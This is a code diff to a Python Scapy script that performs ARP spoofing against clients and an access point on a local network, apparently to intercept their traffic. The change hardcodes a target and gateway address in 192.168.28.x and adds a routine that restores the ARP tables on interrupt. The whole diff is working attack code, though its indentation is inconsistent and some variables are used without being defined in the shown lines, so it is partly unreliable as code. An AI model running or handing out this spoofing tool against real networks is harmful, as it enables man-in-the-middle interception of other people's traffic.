@@ -5,15 +5,13 @@ import time
 import socket
 import fcntl
 import struct
-import netifaces
+import sys
 
 def get_ip_address(ifname):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     return socket.inet_ntoa(fcntl.ioctl(s.fileno(),0x8915,struct.pack('256s',ifname[:15]))[20:24])
 
 target_ip = get_ip_address('ens33') + '/24'
-gws = netifaces.gateways()
-test_ip = gws['default'][netifaces.AF_INET][0]
 # IP Address for the destination
 # create ARP packet
 arp = ARP(pdst=target_ip)
@@ -48,9 +46,24 @@ def spoof(target_ip, spoof_ip):
     packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,psrc=spoof_ip)
     scapy.send(packet,verbose=0)
 
-while True:
-    for client in clients:
-    	if client['ip'] != ap:
-	    spoof(client['ip'], ap)
-	    spoof(ap, client['ip'])
-    time.sleep(2)
+def restore(dest_ip, src_ip):
+    dest_mac = a[dest_ip]
+    src_mac = a[src_ip]
+    packet = ARP(op=2, pdst = dest_ip, hwdst= dest_mac, psrc= src_ip, hwsrc= src_mac)
+    scapy.send(packet,count=4, verbose=0)
+
+target_ip = "192.168.28.130"
+gateway_ip = "192.168.28.1"
+try:
+    while True:
+        for client in clients:
+    	    if client['ip'] != ap:
+	        spoof(client['ip'], ap)
+	        spoof(ap, client['ip'])
+	    sys.stdout.flush()
+            time.sleep(2)
+
+except KeyboardInterrupt:
+    print("\nResetting ARP\n")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
